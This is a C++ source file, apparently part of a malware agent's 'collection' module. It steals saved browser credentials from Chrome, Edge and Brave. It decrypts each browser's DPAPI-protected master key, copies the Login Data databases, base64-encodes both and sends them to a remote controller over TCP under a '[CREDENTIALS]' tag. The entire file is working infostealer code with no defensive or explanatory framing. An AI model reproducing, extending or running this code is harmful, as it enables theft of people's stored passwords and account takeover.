#include <winsock2.h>
#include "agent/modules/collection/browser_stealer.hpp"
#include "agent/network/tcp_client.hpp"
#include <fstream>
#include <iostream>
#include <shlobj.h>
#include <wincrypt.h>
#include <filesystem>
#include <vector>
#include <sstream>

// Link against Crypt32.lib
#pragma comment(lib, "crypt32.lib")

namespace fs = std::filesystem;

// External reference to the global TCP client
extern TcpClient* globalTcp; 

void BrowserStealer::Run() {
    StealChrome();
    StealEdge();
    StealBrave();
}

std::string BrowserStealer::Base64Decode(const std::string& encoded) {
    static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";
             
    std::string ret;
    std::vector<int> T(256, -1);
    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;

    int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (T[c] == -1) break;
        val = (val << 6) + T[c];
        valb += 6;
        if (valb >= 0) {
            ret.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return ret;
}

std::string BrowserStealer::GetMasterKey(const std::string& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) return "";
    
    std::stringstream buffer;
    buffer << file.rdbuf();
    std::string content = buffer.str();
    
    std::string search = "\"encrypted_key\":\"";
    size_t pos = content.find(search);
    if (pos == std::string::npos) return "";
    
    size_t end = content.find("\"", pos + search.length());
    if (end == std::string::npos) return "";
    
    std::string b64Key = content.substr(pos + search.length(), end - (pos + search.length()));
    std::string encryptedKey = Base64Decode(b64Key);
    
    if (encryptedKey.substr(0, 5) != "DPAPI") return "";
    encryptedKey = encryptedKey.substr(5);
    
    DATA_BLOB in;
    DATA_BLOB out;
    in.pbData = (BYTE*)encryptedKey.data();
    in.cbData = (DWORD)encryptedKey.size();
    
    if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)) {
        std::string masterKey((char*)out.pbData, out.cbData);
        LocalFree(out.pbData);
        return masterKey;
    }
    
    return "";
}

bool BrowserStealer::ExfiltrateFile(const std::string& filePath, const std::string& tag) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string destPath = std::string(tempPath) + "bf_temp.db";
    
    if(!CopyFileA(filePath.c_str(), destPath.c_str(), FALSE)) return false;
    
    std::ifstream file(destPath, std::ios::binary);
    if (!file.is_open()) return false;
    
    std::vector<unsigned char> data((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    file.close();
    DeleteFileA(destPath.c_str());
    
    static const std::string base64_chars = 
             "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
             "abcdefghijklmnopqrstuvwxyz"
             "0123456789+/";
    
    std::string encoded;
    int i = 0, j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    for (auto byte : data) {
        char_array_3[i++] = byte;
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for(i = 0; (i <4) ; i++)
                encoded += base64_chars[char_array_4[i]];
            i = 0;
        }
    }
    if (i) {
        for(j = i; j < 3; j++) char_array_3[j] = '\0';
        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;
        for (j = 0; (j < i + 1); j++) encoded += base64_chars[char_array_4[j]];
        while((i++ < 3)) encoded += '=';
    }

    std::string packet = "[CREDENTIALS]:" + tag + ":" + encoded;
    if(globalTcp) globalTcp->SendData(packet);
    
    return true;
}

void BrowserStealer::StealChrome() {
    char path[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::string userData = std::string(path) + "\\Google\\Chrome\\User Data";
        if(fs::exists(userData)) {
            std::string key = GetMasterKey(userData + "\\Local State");
            if(!key.empty()) {
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string keyPath = std::string(tempPath) + "chrome_key.bin";
                std::ofstream keyFile(keyPath, std::ios::binary);
                keyFile.write(key.data(), key.size());
                keyFile.close();
                ExfiltrateFile(keyPath, "CHROME_KEY");
                DeleteFileA(keyPath.c_str());
            }
            ExfiltrateFile(userData + "\\Default\\Login Data", "CHROME_DB");
        }
    }
}

void BrowserStealer::StealEdge() {
     char path[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::string userData = std::string(path) + "\\Microsoft\\Edge\\User Data";
        if(fs::exists(userData)) {
            std::string key = GetMasterKey(userData + "\\Local State");
            if(!key.empty()) {
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string keyPath = std::string(tempPath) + "edge_key.bin";
                std::ofstream keyFile(keyPath, std::ios::binary);
                keyFile.write(key.data(), key.size());
                keyFile.close();
                ExfiltrateFile(keyPath, "EDGE_KEY");
                DeleteFileA(keyPath.c_str());
            }
            ExfiltrateFile(userData + "\\Default\\Login Data", "EDGE_DB");
        }
    }
}

void BrowserStealer::StealBrave() {
    char path[MAX_PATH];
    if(SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path))) {
        std::string userData = std::string(path) + "\\BraveSoftware\\Brave-Browser\\User Data";
        if(fs::exists(userData)) {
            std::string key = GetMasterKey(userData + "\\Local State");
            if(!key.empty()) {
                char tempPath[MAX_PATH];
                GetTempPathA(MAX_PATH, tempPath);
                std::string keyPath = std::string(tempPath) + "brave_key.bin";
                std::ofstream keyFile(keyPath, std::ios::binary);
                keyFile.write(key.data(), key.size());
                keyFile.close();
                ExfiltrateFile(keyPath, "BRAVE_KEY");
                DeleteFileA(keyPath.c_str());
            }
            ExfiltrateFile(userData + "\\Default\\Login Data", "BRAVE_DB");
        }
    }
}
